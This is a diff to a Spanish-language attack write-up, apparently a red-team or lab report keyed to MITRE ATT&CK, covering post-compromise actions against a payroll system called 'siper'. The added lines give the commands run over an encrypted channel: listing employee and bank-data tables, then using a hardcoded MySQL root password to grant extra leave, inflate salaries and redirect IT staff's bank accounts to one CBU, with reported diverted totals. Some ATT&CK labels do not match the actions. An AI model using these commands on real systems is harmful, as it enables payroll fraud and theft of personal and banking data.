@@ -852,10 +852,8 @@ resultado:
                 
 
 ## Actions on Objectives
-- TA0009 – Collection
-
-    Recopilación de Información mediante Canal Cifrado
-    - T1082 – System Information Discovery
+     Recopilación de Información mediante Canal Cifrado
+     - T1082 – System Information Discovery
       Descubrimiento de estructura mediante canal cifrado:
       ```text
 
@@ -869,10 +867,91 @@ resultado:
       /var/www/html/siper/config/database.conf
       /var/www/html/siper/backups/backup_20240901.sql
       ```
+    - T1005 – Data from Local System
+       Análisis de la base de datos mediante cifrado:
+       ```text
+       # Verificar base de datos usando canal seguro
+       ejecutar_comando_cifrado 'ls -la /var/www/html/siper/database/ && file /var/www/html/siper/database/empleados.db'
+
+       ```
+       Respuesta descifrada:
+       ```text
+       -rw-r--r-- 1 www-data www-data 2457600 Sep 10 14:30 empleados.db
+       /var/www/html/siper/database/empleados.db: SQLite 3.x database
+       ```
+     - T1213 – Data from Information Repositories
+        Análisis de estructura de tablas cifrado:
+        ```text
+        # Examinar tablas mediante canal seguro
+        ejecutar_comando_cifrado 'sqlite3 /var/www/html/siper/database/empleados.db .tables'
+        ```
+        Respuesta:
+        ```text
+        empleados
+        licencias
+        datos_bancarios
+        usuarios
+        configuracion
+        ```
+     - TA0009 – Collection  
+      Recolección de información sensible mediante cifrado:
+      ```text
+      # Contar registros de empleados por canal seguro
+      ejecutar_comando_cifrado 'sqlite3 /var/www/html/siper/database/empleados.db "SELECT COUNT(*) FROM empleados"'
+      ```
+      Resultado descifrado: 5342
+     
+     - T1484 – Domain Policy Modification
+      Modificación de licencias mediante canal seguro:
+      ```text
+       # Modificar licencias usando MySQL a través del canal cifrado
+       COMANDO='echo "UPDATE licencias SET dias_disponibles = dias_disponibles + 15 WHERE tipo = \"ordinaria\";" | mysql -u root -pVialidad2024 siper_db'
+       ejecutar_comando_cifrado "$COMANDO"
+      ```
+      Verificación segura:
+      ```text
+      ejecutar_comando_cifrado 'echo "SELECT COUNT(*) FROM licencias WHERE tipo = \"ordinaria\" AND dias_disponibles > 30;" | mysql -u root -pVialidad2024 siper_db' 
+      
+      ```
+      
+      Resultado descifrado: 247
+     
+     - T1482 – Domain Trust Discovery
+      Alteración salarial mediante canal seguro:
 
 
+      ```text
+         # Modificar salarios por canal cifrado
+        COMANDO='echo "UPDATE empleados SET categoria = categoria - 2, salario = salario * 1.28 WHERE antiguedad > 5 LIMIT 34;" | mysql -u root -pVialidad2024 siper_db'
+        ejecutar_comando_cifrado "$COMANDO"
+
+      ``` 
+      Verificación:
+      ```text
+      ejecutar_comando_cifrado 'echo "SELECT COUNT(*) FROM empleados WHERE salario > (SELECT AVG(salario)*1.2 FROM empleados);" | mysql -u root -pVialidad2024 siper_db'
+      ```
+      Resultado descifrado: 34      
 
 
-- TA0010 – Exfiltration
+      
+     - TA0010 – Exfiltration
 
+      Desvío de fondos mediante canal seguro:
+      ```text
+       # Redireccionar pagos usando canal cifrado
+       COMANDO='echo "UPDATE datos_bancarios SET cbu = \"0123456789012345678901\" WHERE empleado_id IN (SELECT id FROM empleados WHERE gerencia = \"TI\");" | mysql -u root -pVialidad2024 siper_db'
+       ejecutar_comando_cifrado "$COMANDO"
+      ```
+      Verificación:
+      ```text
+      ejecutar_comando_cifrado 'echo "SELECT COUNT(*) FROM datos_bancarios WHERE cbu = \"0123456789012345678901\";" | mysql -u root -pVialidad2024 siper_db'
+      ```
 
+      Cálculo de monto seguro:
+      ```text
+
+      ejecutar_comando_cifrado 'echo "SELECT SUM(salario) FROM empleados WHERE id IN (SELECT empleado_id FROM datos_bancarios WHERE cbu = \"0123456789012345678901\");" | mysql -u root -pVialidad2024 siper_db'
+
+      ```
+
+      Monto desviado descifrado: 3842150
